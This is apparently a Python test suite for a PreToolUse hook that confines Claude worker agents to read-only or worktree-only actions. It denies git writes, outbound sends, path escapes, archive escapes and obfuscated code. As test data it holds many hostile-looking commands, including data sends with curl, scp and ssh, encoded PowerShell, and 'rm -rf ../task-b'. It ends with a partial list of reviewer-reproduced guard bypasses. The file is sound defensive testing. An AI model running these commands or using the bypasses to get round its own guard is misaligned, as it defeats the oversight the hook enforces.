"""twinlane guard: the PreToolUse hook twinlane passes to its own Claude workers. Pure parsing; no model calls."""
import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from unittest import mock

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

import test_support  # noqa: E402; isolated temp home before importing twinlane
from twinlane import common, guard  # noqa: E402

ALLOW = common.load_policy()['claude']['intel_allow']
WT = ('\x43:\x2fUsers/alice/worktrees/task-a' if os.name == 'nt' else
      os.path.join(tempfile.gettempdir(), 'twinlane-guard-worktree', 'task-a'))
OTHER = os.path.join(tempfile.gettempdir(), 'twinlane-guard-other', 'x.py')
PARENT = os.path.dirname(WT)  # outside the job worktree on every OS


def bash(cmd):
    return {'command': cmd}


class ShellHazards(unittest.TestCase):
    """prefix deny rules miss git global options, full paths, PowerShell and wrappers."""

    def test_denied_in_every_profile(self):
        for cmd in ('git commit -m x', 'git -C . commit -m x', 'git -c core.hooksPath=/dev/null commit -m x',
                    'git --git-dir=.git push', '"\x43:/Program Files/Git/cmd/git.exe" push origin master',
                    'cmd //c "git push"', 'cmd /c git push', 'powershell -Command "git reset --hard HEAD~1"',
                    'GIT_DIR=.git git push', 'git reset --hard', 'git clean -fdx', 'git rebase -i HEAD~3',
                    'git worktree remove ../x', 'git branch -D feature', 'git branch --delete feature',
                    'git cherry-pick abc', 'git update-ref -d refs/heads/x',
                    'claude -p hi', '\x43:\x2fUsers/alice/.local/bin/claude.exe -p hi', 'codex exec hi',
                    'python \x43:\x2fUsers/alice/projects/twinlane/twinlane/cli.py run --brief b', 'twinlane run --brief b',
                    'ls && git push'):
            for profile in ('intel', 'code'):
                self.assertIsNotNone(guard.evaluate('Bash', bash(cmd), profile, WT, ALLOW), (profile, cmd))
        self.assertIsNotNone(guard.evaluate('PowerShell', bash('git push origin x'), 'code', WT, ALLOW))

    def test_read_only_git_is_allowed(self):
        for cmd in ('git log --oneline -10', 'git status', 'git log | head -5', 'git diff HEAD~1 -- a.php',
                    'git -C . log -3', 'git branch --list', 'git worktree list'):
            self.assertIsNone(guard.shell_hazard(cmd), cmd)


class IntelProfile(unittest.TestCase):
    """Findings 8 and 13: intel stays read-only whatever the settings inherit."""

    def test_write_capable_forms_of_allowed_commands(self):
        for cmd in ('git diff --output=x.log', 'git log --output x', 'git diff --ext-diff', 'rg --pre cat foo',
                    'rg --pre=sh x', 'git log > out.txt', 'ls `rm -rf x`', 'ls $(touch x)', 'head a.txt >> b'):
            self.assertIsNotNone(guard.evaluate('Bash', bash(cmd), 'intel', WT, ALLOW), cmd)

    def test_a_lone_ampersand_starts_a_new_command(self):
        # `git log & python -c ...` passed the intel guard (no split on a lone &)
        for cmd in ('git log & python -c "open(1,2)"', 'git status&python x.py', 'rg foo &\r\nnpm test',
                    'git log -3 |& python x.py'):
            self.assertIsNotNone(guard.evaluate('Bash', bash(cmd), 'intel', WT, ALLOW), cmd)
        for profile in ('intel', 'code'):
            self.assertIsNotNone(guard.evaluate('Bash', bash('ls & git push'), profile, WT, ALLOW), profile)
            self.assertIsNotNone(guard.evaluate('Bash', bash('git status & claude -p hi'), profile, WT, ALLOW))
        self.assertIsNone(guard.evaluate('Bash', bash('git log -3 && git status'), 'intel', WT, ALLOW))
        self.assertIsNone(guard.evaluate('Bash', bash('php -l a.php > /dev/null 2>&1'), 'code', WT, ALLOW))

    def test_only_the_allow_list(self):
        self.assertIsNone(guard.evaluate('Bash', bash('rg -n foo helpers/'), 'intel', WT, ALLOW))
        self.assertIsNone(guard.evaluate('Bash', bash('git log -3 | head -2'), 'intel', WT, ALLOW))
        for cmd in ('python x.py', 'php -r "file_put_contents(1,2);"', 'curl -X POST http://x', 'npm test'):
            self.assertIsNotNone(guard.evaluate('Bash', bash(cmd), 'intel', WT, ALLOW), cmd)
        for tool in ('Edit', 'Write', 'PowerShell', 'NotebookEdit', 'mcp__claude-in-chrome__navigate',
                     'mcp__example__write', 'mcp__computer-use__left_click'):
            self.assertIsNotNone(guard.evaluate(tool, {}, 'intel', WT, ALLOW), tool)
        for tool in ('Read', 'Grep', 'Glob', 'WebFetch', 'ToolSearch'):
            self.assertIsNone(guard.evaluate(tool, {}, 'intel', WT, ALLOW), tool)

    def test_nested_agents_are_denied_for_both_profiles(self):
        for profile in ('intel', 'code'):
            for tool in ('Agent', 'Task'):
                self.assertIsNotNone(guard.evaluate(tool, {}, profile, WT, ALLOW))


class CodeProfile(unittest.TestCase):
    """the code profile is confined to its worktree, not only by the prompt."""

    def test_file_tools_inside_and_sibling_worktree(self):
        self.assertIsNone(guard.evaluate('Edit', {'file_path': WT + '/src/x.py'}, 'code', WT, ALLOW))
        self.assertIsNone(guard.evaluate('Write', {'file_path': 'src/new.py'}, 'code', WT, ALLOW))
        path = WT + '/../task-b/x.py'
        self.assertIsNotNone(guard.evaluate('Edit', {'file_path': path}, 'code', WT, ALLOW))

    @unittest.skipUnless(os.name == 'nt', 'Windows drive-letter paths only')
    def test_file_tools_outside_the_windows_worktree(self):
        for path in ('\x43:/work/example-repo/src/x.py', '\x43:\\projects-alt\\a.py',
                     '/c/work/example-repo/x.py'):
            self.assertIsNotNone(guard.evaluate('Edit', {'file_path': path}, 'code', WT, ALLOW), path)

    @unittest.skipIf(os.name == 'nt', 'POSIX absolute paths only')
    def test_file_tools_outside_the_posix_worktree(self):
        self.assertIsNotNone(guard.evaluate('Edit', {'file_path': OTHER}, 'code', WT, ALLOW))

    def test_writing_shell_commands_inside_the_worktree(self):
        self.assertIsNone(guard.evaluate('Bash', bash(f'cp a.py {WT}/b.py'), 'code', WT, ALLOW))
        self.assertIsNone(guard.evaluate('Bash', bash('python -m py_compile a.py > /dev/null'), 'code', WT, ALLOW))

    @unittest.skipUnless(os.name == 'nt', 'Windows drive-letter paths only')
    def test_writing_shell_commands_outside_the_windows_worktree(self):
        self.assertIsNotNone(guard.evaluate('Bash', bash('cp a.py \x43:/work-alt/a.py'), 'code', WT, ALLOW))
        self.assertIsNotNone(guard.evaluate('PowerShell', bash('Set-Content -Path \x43:\\projects\\x.txt -Value 1'),
                                            'code', WT, ALLOW))
        self.assertIsNone(guard.evaluate('Bash', bash('cat \x43:/work/example-repo/README.md'), 'code', WT,
                                         ALLOW))  # reading outside is fine

    @unittest.skipUnless(os.name == 'nt', 'cmd switches only exist on Windows')
    def test_cmd_switches_inside_the_windows_worktree_are_not_paths(self):
        for cmd in ('del /Q build\\x.txt', 'rmdir /S /Q build', 'robocopy src dst /MIR', 'xcopy src dst /E /I',
                    'del /F /Q build', 'move /Y a.txt b.txt', 'copy /Y a.txt b.txt', 'rd /s /q build'):
            self.assertIsNone(guard.evaluate('Bash', bash(cmd), 'code', WT, ALLOW), cmd)
        self.assertIsNotNone(guard.evaluate('Bash', bash('rm -f /c/other/a.py'), 'code', WT, ALLOW))

    def test_a_root_path_given_to_a_powershell_alias_is_not_a_cmd_switch(self):
        # In PowerShell del/move/copy/rd/erase are Remove-Item/Move-Item/Copy-Item and /outside is a root path.
        for cmd in ('del -Recurse -Force /outside', 'del -Path /outside -Recurse', 'del -LiteralPath /outside',
                    'move src.txt /outside', 'copy src /outside', 'rd /s /q /outside', 'erase /outside'):
            for tool in ('Bash', 'PowerShell'):
                self.assertIsNotNone(guard.evaluate(tool, bash(cmd), 'code', WT, ALLOW), (tool, cmd))

    @unittest.skipIf(os.name == 'nt', 'POSIX absolute paths only')
    def test_writing_shell_commands_outside_the_posix_worktree(self):
        self.assertIsNotNone(guard.evaluate('Bash', bash(f'cp a.py {OTHER}'), 'code', WT, ALLOW))
        self.assertIsNotNone(guard.evaluate('PowerShell', bash(f'Set-Content -Path {OTHER} -Value 1'),
                                            'code', WT, ALLOW))
        self.assertIsNone(guard.evaluate('Bash', bash(f'cat {OTHER}'), 'code', WT, ALLOW))


def code(cmd, tool='Bash', shell_cwd=None):
    return guard.evaluate(tool, bash(cmd), 'code', WT, ALLOW, shell_cwd)


class GuardProbes(unittest.TestCase):
    """The four probes the code profile allowed, and the matching
    legitimate commands that must stay allowed."""

    def test_the_four_probes_are_denied(self):
        probes = {'python -c "import subprocess; subprocess.run([\'git\',\'commit\',\'-m\',\'x\'])"': 'git commit',
                  'cp artifact.txt ../outside.txt': 'outside the job worktree',
                  'curl -X POST https://api.example.com/send -d x=1': 'curl -X POST'}
        for cmd, why in probes.items():
            self.assertIn(why, code(cmd) or '', cmd)
        # The PHP send probe runs a script FILE: the guard does not read files, so it stays allowed
        # (builds and tests run that way). Its credentials are what is removed (test_jobs env-strip tests).
        self.assertIsNone(code('php send_mail.php --all'))

    def test_the_legitimate_neighbours_stay_allowed(self):
        for cmd in ('python -m unittest', 'python -B -m unittest discover -s tests', 'php -l f.php', 'cp a b',
                    f'cp a {WT}/b', 'git diff', 'git status', 'git log --oneline -10',
                    'curl http://127.0.0.1/app/api.php?x=1', 'curl -s http://localhost:8080/health',
                    'python foo.py'):
            self.assertIsNone(code(cmd), cmd)


class InterpreterInlineCode(unittest.TestCase):
    def test_git_writes_inside_inline_code_are_denied(self):
        for cmd in ('python -c "import subprocess; subprocess.run([\'git\', \'push\'])"',
                    'python -c "import os; os.system(\'git commit -am x\')"',
                    'py -3 -c "import subprocess; subprocess.call([\'git\',\'-C\',\'.\',\'rebase\',\'main\'])"',
                    'node -e "require(\'child_process\').execSync(\'git push\')"',
                    "php -r \"shell_exec('git commit -am x');\"",
                    'ruby -e "system(\'git\', \'merge\', \'x\')"', 'perl -e "system(\'git tag v1\')"',
                    'bash -c "ls; git push"', 'sh -lc "git reset --hard"', 'cmd /c "git update-ref -d x"',
                    'powershell -NoProfile -Command "git worktree add ../x"', 'pwsh -c "git branch -f main"',
                    'python - <<\'EOF\'\nimport subprocess\nsubprocess.run(["git", "push"])\nEOF',
                    'bash <<EOF\ngit commit -m x\nEOF', 'bash <<< "git push"',
                    'find . -name x -exec git commit -m x \\;', 'Start-Process git -ArgumentList "push"',
                    'Get-ChildItem | % { git push }', 'eval "git push"'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_unreadable_code_is_denied(self):
        for cmd in ('cat x.sh | bash', 'echo "git push" | sh', 'Get-Content x.py | python -',
                    'powershell -EncodedCommand SQBFAFgA', 'pwsh -enc SQBFAFgA', 'eval "$CMD"',
                    'python -c "import base64; exec(base64.b64decode(\'eA==\'))"', '$(echo git) push',
                    '`echo git` push', '& $exe commit'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_ordinary_inline_code_and_scripts_stay_allowed(self):
        for cmd in ('python -c "import sys; print(sys.version)"', 'node -e "console.log(1)"', 'php -r "echo 1;"',
                    'python - <<\'EOF\'\nimport json\nprint(json.load(open("policy.json"))["claude"])\nEOF',
                    'cat > t.py <<\'EOF\'\nos.system("git commit")\nEOF',  # a heredoc into a file is data
                    'git diff | python -m json.tool', 'perl -pe "s/a/b/" a.txt', 'bash build.sh',
                    'powershell -NoProfile -Command "Get-ChildItem"',
                    'Get-ChildItem | % { $_.Name }', 'npm test; $LASTEXITCODE', '$r = git status',
                    'grep -rn "git commit" .', 'rg "curl -X POST" tests'):
            self.assertIsNone(code(cmd), cmd)
        self.assertIsNotNone(code('powershell -NoProfile -File build.ps1'))


class GitWrites(unittest.TestCase):
    def test_denied(self):
        for cmd in ('git tag v1', 'git tag -a v1 -m x', 'git worktree add ../x', 'git branch -f main HEAD~1',
                    'git reset HEAD~1', 'git reset', 'git pull', 'git revert HEAD', 'git checkout -B main',
                    'git -c alias.ci=commit ci -m x', 'git -c core.pager=sh log', 'git symbolic-ref HEAD x',
                    'git config alias.ci commit', 'git config core.hooksPath hooks', 'git config --global a.b c',
                    'git config set a.b c', 'git config --unset a.b', 'git submodule foreach "git push"',
                    'git send-pack origin main', 'git http-push x', 'git imap-send', 'git notes add -m x',
                    'git replace a b', 'git svn dcommit', 'git p4 submit', 'git fetch --upload-pack=x origin',
                    'git ls-remote --upload-pack x origin', 'git -c protocol.ext.allow=always fetch x',
                    'git -c core.gitproxy=x fetch'):
            for profile in ('intel', 'code'):
                self.assertIsNotNone(guard.evaluate('Bash', bash(cmd), profile, WT, ALLOW), (profile, cmd))

    def test_allowed(self):
        for cmd in ('git tag --list', 'git tag', 'git add a.py', 'git restore --staged a.py', 'git fetch',
                    'git checkout -- a.py', 'git -c color.ui=never log -3', 'git config user.name',
                    'git config --get user.name', 'git config --list', 'git config get user.name',
                    'git notes list', 'git notes show HEAD', 'git submodule status'):
            self.assertIsNone(code(cmd), cmd)


class RelativePathEscapes(unittest.TestCase):
    def test_denied(self):
        for cmd in ('cp a.txt ../outside.txt', 'echo hi > ../x.txt', 'echo hi >> ..\\x.txt', 'mkdir ~/x',
                    'touch $HOME/x', 'touch %USERPROFILE%\\x', 'touch "$(pwd)/../x"', 'rm -rf ../task-b',
                    'cd .. && touch x', 'cd $UNSET_DIR_X && touch x', 'pushd .. && cp a b',
                    'unzip a.zip -d ./../x > log.txt', 'tar -xf a.tar -C ./../x > l.txt',
                    'unzip a.zip -d ../x > log.txt', 'tar -xf a.tar --directory=../x > l.txt',
                    'Copy-Item a.txt -Destination ..\\x.txt', 'Set-Content -Path ..\\x.txt -Value 1',
                    'tee ../log.txt', 'cp --target-directory=../x a', 'curl -o ../x http://127.0.0.1/',
                    'git -C ../task-b checkout .', "python -c \"open('../x.txt','w').write('1')\"",
                    'python -c "import os; os.system(\'rm -rf ../x\')"', 'sed -i "s/a/b/" ../f.txt'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_allowed(self):
        for cmd in ('cp a b', 'mkdir -p build/x && cp a build/x/', 'cd tests && touch x', 'cd sub/.. && cp a b',
                    'echo hi > out.txt', 'php -l a.php > /dev/null 2>&1', 'python x.py 2>$null', 'echo x > nul',
                    'cp a sub/../b', 'cat ../other/file', 'ls ../',
                    'pushd sub && cp a b && popd && cp c d', f'cd {WT}/sub && cp a b'):
            self.assertIsNone(code(cmd), cmd)
        self.assertIsNotNone(code('git -C ../task-b log -3'))

    # Every escape spelling under every way a command can take a path. A guard fix that closes one cell and
    # misses its neighbour fails here, not in the next review.
    SPELLINGS = ('../x', './../x', '..\\x', '"../x"', "'../x'", 'sub/../../x', '..')
    SHAPES = ('unzip a.zip -d {p} > log.txt', 'unzip a.zip -d{p} > log.txt', 'tar -xf a.tar -C{p} > l.txt',
              'tar -xvC{p} -f a.tar > l.txt', 'tar -xf a.tar --directory={p} > l.txt', 'dd if=a of={p}',
              'rsync a {p}', 'cp a {p}', 'touch {p}', 'echo x > {p}', 'Copy-Item a -Destination:{p}',
              'unzip a.zip -d {p}', 'tar -xf a.tar -C {p}', 'Expand-Archive a.zip -DestinationPath {p}',
              'wget -q http://127.0.0.1/x -O {p}', 'sort -o {p} a', 'split a {p}', 'csplit -f {p} a 1',
              'sqlite3 {p} "create table t(a)"', 'python -m zipfile -e a.zip {p}')
    # Destinations that are not `..` but still outside: home, variables, roots, and a POSIX-escaped dot.
    ROOTED = ('~/x', '$HOME/x', '${HOME}/x', '%TEMP%\\x', '/tmp/x', '.\\./x')

    def test_rooted_destinations_in_every_option_shape_are_denied(self):
        for shape in self.SHAPES:
            if shape.startswith('echo'):
                continue
            for p in self.ROOTED:
                self.assertIsNotNone(code(shape.format(p=p)), shape.format(p=p))

    def test_archive_options_that_let_member_names_escape_are_denied(self):
        for cmd in ('unzip -: a.zip', 'unzip -o -: a.zip', 'tar -xPf a.tar', 'tar xPf a.tar',
                    'tar --absolute-names -xf a.tar', 'tar -xf a.tar --transform s,^,../,', 'bsdtar -xf a.tar -s ,^,../,',
                    'cpio -idm < a.cpio', 'cpio --extract < a.cpio', '7z x a.7z -spf', 'jar xf a.jar',
                    'busybox tar -xPf a.tar', 'sudo tar -xPf a.tar', 'nohup unzip -: a.zip', '/usr/bin/tar -xPf a.tar'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_every_abbreviation_and_position_of_an_escaping_archive_option_is_denied(self):
        # getopt accepts any unambiguous prefix (`--ab`), and an option may sit before, between or after. This
        # list is the test's own, not the guard's table: the guard allowlists, so unknown options fail too.
        dangerous = {'tar': ('--absolute-names', '--absolute-paths', '--insecure', '--transform', '--xform',
                             '--to-command', '--checkpoint-action', '--info-script', '--new-volume-script',
                             '--rsh-command', '--use-compress-program', '--keep-directory-symlink', '--options'),
                     'cpio': ('--extract',), 'jar': ('--extract',)}
        for head, names in (('tar', dangerous['tar']), ('bsdtar', dangerous['tar']), ('cpio', dangerous['cpio']),
                            ('jar', dangerous['jar'])):
            for name in names:
                for cut in range(3, len(name) + 1):
                    opt = name[:cut]
                    if any(s.startswith(opt) for s in guard.TAR_SAFE_LONG) and head in guard.TAR_NAMES:
                        continue  # also a prefix of a safe option: ambiguous, so tar itself refuses it
                    for cmd in (f'{head} {opt} -f a', f'{head} -v {opt}=x -f a', f'{head} -f a {opt}'):
                        self.assertIsNotNone(code(cmd), cmd)
        for cmd in ('jar -v -x -f a.jar', 'jar -vxf a.jar', 'jar vxf a.jar', 'jar -f a.jar -x', 'cpio -vid < a',
                    'tar -v -P -xf a.tar', 'tar -xvPf a.tar', 'bsdtar -x -s ,a,b, -f a.tar', 'tar -xIzstd -f a',
                    'tar -xF s.sh -f a', 'tar --frobnicate -xf a.tar', 'pax -rf a.pax', 'bsdcpio -i < a',
                    'python3 -m tarfile -e a.tar out', 'unzip -^ a.zip', '7z x a.7z -snl', '7z x a.7z -SPF'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_any_command_that_is_not_read_only_is_checked_for_outside_paths(self):
        # The set of commands that can modify a file is open-ended, so the default is inverted: only a known
        # read-only command may name `..` or home paths unchecked.
        for cmd in ('sed --in-place s/a/b/ ../x', 'sed -Ei s/a/b/ ../x', 'perl -pi -e s/a/b/ ../x',
                    'ruby -i -pe 1 ../x', 'awk -i inplace 1 ../x', 'chmod 777 ../x', 'chown me ../x', 'mkfifo ../x',
                    'shred ../x', 'unlink ../x', 'setfacl -m u:x:rw ../x', 'chattr +i ../x', 'ed -s ../x',
                    'ex -sc wq ../x', 'vim -es -c wq ../x', 'mktemp ../x.XXXX', 'icacls ../x /grant Everyone:F',
                    'attrib +r ../x', 'Set-ItemProperty ../x -Name IsReadOnly -Value 1', 'go build -o ../x',
                    'cargo build --target-dir ../x', 'gcc -o ../x a.c', 'gcc -o/tmp/x a.c', 'python -m venv ../x',
                    'git apply --directory=../x a.diff', 'npm install --prefix ~/x', 'chmod 600 ~/x',
                    'find .. -name x -delete', 'find ../x -exec rm {} ;', 'python ../tools/x.py'):
            self.assertIsNotNone(code(cmd), cmd)

    def test_read_only_commands_and_inside_paths_stay_allowed(self):
        for cmd in ('cat ../other/file', 'ls ../', 'grep -rn foo ../other', 'find .. -name x', 'diff a ../b',
                    'head -5 ~/notes.txt', 'Get-Content ..\\x.txt', 'chmod +x sub/../run.sh',
                    'gcc -Iinclude -o build/a a.c', 'go build -o bin/app ./cmd/app', 'cargo build --target-dir target',
                    'python -m venv .venv', 'npm install --prefix ./tools', 'make $TARGET', 'npm run $SCRIPT',
                    'sed -i s/a/b/ src/x.py', 'perl -pi -e s/a/b/ src/x', 'python tools/x.py', 'echo $HOME > out.txt'):
            self.assertIsNone(code(cmd), cmd)

    def test_read_only_commands_with_a_write_or_run_option_are_checked(self):
        # A command is read-only per CALL: one write/run option, output operand or writing subcommand makes it a
        # writer, in every spelling (cluster, attached, `=`).
        for cmd in ('xxd a ../x', 'xxd -r a ../x', 'xxd a /tmp/x', 'tree -o ../x', 'tree -R -H . ..',
                    'less -o ../x a', 'less --log-file=../x a', 'file -C -m ../x', 'rg --pre rm foo ..',
                    'rg --pre=rm foo ../b', 'fd . .. -x rm', 'fd -Hx rm . ..', 'fd -HX rm . ../b',
                    'git bundle create ../x.bundle HEAD', 'git clone . ../x', 'git init ../x',
                    'git grep -O../x.sh foo', 'git grep --open-files-in-pager=../x foo', 'git diff --output=../x'):
            self.assertIsNotNone(code(cmd), cmd)
        for cmd in ('xxd ../x', 'xxd a | head', 'tree -L 2 ..', 'file ../x', 'fd -tx foo', 'fd -H foo ..',
                    'rg foo ../sibling', 'git log ../x', 'git diff ../a ../b',
                    'git -c color.ui=never log -3', 'grep -o foo src/a'):
            self.assertIsNone(code(cmd), cmd)
        self.assertIsNotNone(code('git -C ../task-b status'))

    def test_brace_and_glob_expansions_that_reach_dotdot_are_resolved(self):
        for cmd in ('cp a {..,b}/x', 'cp a -t{..,b}', 'tar -xf a -C{..,b}', 'cp a {.,x}./y', 'cp a .?/x',
                    'cp a .[.]/x', 'rm -rf .*'):
            self.assertIsNotNone(code(cmd), cmd)
        for cmd in ('cp src/{a,b}.py out/', 'mkdir -p out/{x,y}', 'echo {a,b}', 'rm -rf *', 'rm -f *.pyc',
                    'rm -f .*.swp', 'cp a.? out/', 'ls | % { $_ }'):
            self.assertIsNone(code(cmd), cmd)

    def test_run_time_paths_and_ansi_c_quoting_are_not_read_as_literal_text(self):
        bs = chr(92)
        for cmd in ("chmod 777 $'" + bs + "x2e" + bs + "x2e/x'", "chmod 777 $'..'/x",
                    "chmod 777 $'" + bs + "056" + bs + "056/x'", "cp a $'.'./x", 'chmod 777 `echo ..`/x',
                    'chmod 777 $(echo ..)/x', 'cp a ${X:-..}/x', 'cp a ${HOME%/*}/x', 'cp a "${PWD%/*}"/x',
                    'mkdir out/$(echo ../..)', "export $'TAR" + bs + "x5fOPTIONS'=-P"):
            self.assertIsNotNone(code(cmd), cmd)
        for cmd in ("printf '%s' $'a" + bs + "tb'", 'echo $(date) > out.txt', 'make $TARGET',
                    'git log -1 --format=%H'):
            self.assertIsNone(code(cmd), cmd)

    def test_caps_deny_instead_of_checking_part(self):
        self.assertIsNotNone(code('cp a ' + '{a,b,c,d,e,f,g,h}' * 3 + '{..,z}/x'))
        self.assertIsNotNone(code('cp a ' + '{a,b}' * 9 + '/x'))
        self.assertIsNone(code('cp src/{a,b,c}.py out/'))

    def test_code_profile_denies_what_it_cannot_judge(self):
        root = os.path.abspath('job-w').replace(os.sep, '/')
        for tool, ti, cwd in (('mcp__fs__write_file', {'path': 'x'}, root), ('Write', {}, root),
                              ('Write', {'file_path': ['x']}, root), ('Bash', {'command': ['ls']}, root),
                              ('Bash', {}, root), ('Write', {'file_path': root + '/x'}, None),
                              ('Bash', {'command': 'ls'}, None), ('PowerShell', {'command': 'ls'}, '')):
            self.assertIsNotNone(guard.evaluate(tool, ti, 'code', cwd, []), (tool, ti, cwd))
        self.assertIsNone(guard.evaluate('Write', {'file_path': root + '/x'}, 'code', root, []))
        self.assertIsNone(guard.evaluate('Bash', {'command': 'ls'}, 'code', root, []))
        self.assertIsNone(guard.evaluate('Read', {'file_path': 'x'}, 'code', root, []))

    def test_option_channels_outside_the_command_line_are_refused(self):
        # tar reads a -T list's lines as options unless --verbatim-files-from comes first; option variables are
        # refused however the name is spelled; a variable name built at run time cannot be read, so it is refused.
        for cmd in ('tar -xf a.tar -T list', 'tar -xf a.tar --files-from=list', 'tar -xf a.tar --files-from list',
                    'tar -xvTlist -f a.tar', 'tar xTf list a.tar', 'tar -x --files=l -f a.tar',
                    "TAR_''OPTIONS=-P tar -xf a", 'TAPE=../x tar -c src', 'export TAPE=../x',
                    'TAR_READER_OPTIONS=x bsdtar -xf a', 'TAR_WRITER_OPTIONS=x bsdtar -cf a s',
                    "export $'TAR\\x5fOPTIONS'=-P", 'export "$n=-P"', 'export $n',
                    "[Environment]::SetEnvironmentVariable('TAR'+'_OPTIONS','-P')",
                    '[Environment]::SetEnvironmentVariable("TAR$([char]95)OPTIONS","-P")',
                    'Set-Item -Path ("env:" + $n) -Value x', 'python -mtarfile -e a.tar out',
                    'python -I -mtarfile -e a.tar o'):
            self.assertIsNotNone(code(cmd), cmd)
        for cmd in ('tar -xf a.tar --verbatim-files-from -T list', 'tar -xvf a.tar -CTarget',
                    'export PATH="$PATH:bin"', 'export FOO=1', 'declare -A m', 'env -i bash -c true',
                    '$env:PATH = "$env:USERPROFILE' + chr(92) + 'bin;$env:PATH"'):
            self.assertIsNone(code(cmd), cmd)

    def test_everyday_archive_commands_are_allowed(self):
        for cmd in ('tar -xzf a.tgz -C out', 'tar xvf a.tar', 'tar -xvf a.tar --strip-components=1 -C out',
                    'tar --extract --file=a.tar --directory=out', 'tar --strip=1 -xf a.tar', 'tar -tvf a.tar',
                    'tar -czf dist/a.tgz --exclude=.git src', 'tar --zstd -xf a.tar.zst', 'tar -xf - < a.tar',
                    'tar --checkpoint=100 -xf a.tar', 'bsdtar -xf a.tar -C out', 'unzip -oq a.zip -d out',
                    'unzip -l a.zip', 'zip -r out.zip src', '7z x a.7z -oout -y', 'jar tf a.jar',
                    'jar cf out.jar -C build .', 'cpio -o < list > out.cpio', 'cpio -t < a.cpio',
                    'python -m tarfile -l a.tar', 'grep -ri zip src > hits.txt', 'echo $PATH > p.txt'):
            self.assertIsNone(code(cmd), cmd)

    def test_setting_a_variable_an_extractor_reads_as_options_is_denied(self):
        for var in ('TAR_OPTIONS', 'UNZIP', 'UNZIPOPT', 'ZIPOPT', 'ZIP', 'tar_options'):
            for cmd in (f'{var}=-P tar -xf a.tar', f'env {var}=-P tar -xf a.tar', f'export {var}=-P',
                        f'export {var}="--absolute-names"', f'set {var}=-:', f'set "{var}=-:"', f'setx {var} -P',
                        f'$env:{var}="-P"', f'Set-Item env:{var} -Value -P',
                        f'[Environment]::SetEnvironmentVariable("{var}", "-P", "User")', f'declare -x {var}=-P',
                        f'{var}+=-P', f': ${{{var}:=-P}}', f'printf -v {var} -- -P', f'read {var} <<< -P',
                        f'typeset -gx {var}=-P', f'setenv {var} -P', f'New-Item env:{chr(92)}{var} -Value -P',
                        f'python -c "import os; os.environ[\'{var}\']=\'-P\'"', f'export -- {var}'):
                self.assertIsNotNone(code(cmd), cmd)

    def test_archive_defaults_that_strip_member_names_are_allowed(self):
        for cmd in ('unzip a.zip', 'unzip -o a.zip -d out', 'tar -xf a.tar', 'tar -xzf a.tgz -C out', '7z x a.7z',
                    'tar -cf a.tar src', 'echo $HOME > out.txt',
                    'curl -o out.html http://127.0.0.1/x', 'sort a > out.txt', 'tar --checkpoint=100 -xf a.tar'):
            self.assertIsNone(code(cmd), cmd)

    def test_every_escape_spelling_in_every_option_shape_is_denied(self):
        for shape in self.SHAPES:
            for p in self.SPELLINGS:
                self.assertIsNotNone(code(shape.format(p=p)), shape.format(p=p))

    def test_the_same_shapes_inside_the_worktree_are_allowed(self):
        for shape in self.SHAPES:
            for p in ('out', './out', 'sub/../out', '"out"', 'sub\\out'):
                self.assertIsNone(code(shape.format(p=p)), shape.format(p=p))

    def test_relative_paths_resolve_against_the_shells_cwd(self):
        # The hook knows the shell's cwd: after a `cd ..` in an earlier call, `touch x` lands outside.
        self.assertIsNotNone(code('touch x', shell_cwd=PARENT))
        self.assertIsNone(code('touch x', shell_cwd=WT + '/sub'))
        self.assertIsNone(code('touch ../x', shell_cwd=WT + '/sub'))


class OutboundSends(unittest.TestCase):
    def test_denied(self):
        for cmd in ('curl -X POST http://127.0.0.1/send', 'curl -XPUT http://127.0.0.1/x', 'curl -d a=1 http://localhost/x',
                    'curl --data-binary @f http://127.0.0.1/', 'curl -F f=@a http://127.0.0.1/',
                    'curl --json {} http://127.0.0.1/', 'curl -T f http://127.0.0.1/', 'curl https://example.com/send?to=1',
                    'curl --connect-to 127.0.0.1:80:evil.example:80 http://127.0.0.1/', 'curl -K cfg',
                    'wget --post-data=a=1 http://127.0.0.1/x', 'wget https://example.com/x',
                    'Invoke-WebRequest http://127.0.0.1/x -Method Post', 'iwr http://127.0.0.1/x -Body abc',
                    'irm -Uri https://api.example.com/x', 'Invoke-RestMethod -Uri http://127.0.0.1/x -Method DELETE',
                    'Send-MailMessage -To a@b.c -From x -Subject s -SmtpServer smtp',
                    'ssh user@host ls', 'scp a.txt user@host' ':/tmp/', 'rsync -a . host' ':/x', 'sftp host',
                    'gh pr create --fill', 'gh pr merge 3', 'gh issue comment 1 -b x', 'gh api repos/x/y/issues -f t=1',
                    'gh api -X DELETE repos/x', 'az login', 'aws s3 cp a s3://b', 'gcloud auth list',
                    'npm publish', 'docker push x', 'twine upload dist/*',
                    'python -c "import smtplib; smtplib.SMTP(\'h\').sendmail(1,2,3)"',
                    'python -c "import requests; requests.post(\'http://127.0.0.1/x\')"',
                    'python -c "import urllib.request as u; u.urlopen(\'https://api.example.com/x\')"',
                    'powershell -Command "(New-Object Net.WebClient).UploadString(\'http://x\', \'1\')"'):
            for profile in ('intel', 'code'):
                self.assertIsNotNone(guard.evaluate('Bash', bash(cmd), profile, WT, ALLOW), (profile, cmd))

    def test_local_gets_and_reads_stay_allowed(self):
        for cmd in ('curl http://127.0.0.1/app/api.php?x=1', 'curl -fsSL http://localhost:8080/', 'curl --version',
                    'curl -sI http://127.0.0.1/', 'wget -q http://127.0.0.1/x -O out.html',
                    'iwr http://127.0.0.1/x -UseBasicParsing', 'Invoke-RestMethod http://localhost/x -Method Get',
                    'gh pr view 12', 'gh run list', 'gh pr checks 3', 'gh api repos/x/y/pulls', 'gh auth status',
                    'npm test', 'pip install -r requirements.txt',
                    'python -c "import urllib.request as u; print(u.urlopen(\'http://127.0.0.1/x\').read())"'):
            self.assertIsNone(code(cmd), cmd)


# The reviewer's reproduced inputs, exactly.
# The fix group each row depends on is noted for the revert proof.
ROUND1_BYPASSES = (
    ('env -u FOO git commit -m x', 3),
    ('env -u FOO cp a ../out', 3),
    ('env -u FOO curl -X POST http://127.0.0.1/send', 3),
    ('python -c"import subprocess; subprocess.run([\'git\',\'commit\',\'-m\',\'x\'])"', 1),
    ('node -e"require(\'child_process\').execSync(\'git commit -m x\')"', 1),
    ('. git commit -m x', 2),
    ("Start-Process -FilePath git -ArgumentList @('commit','-m','x')", 2),
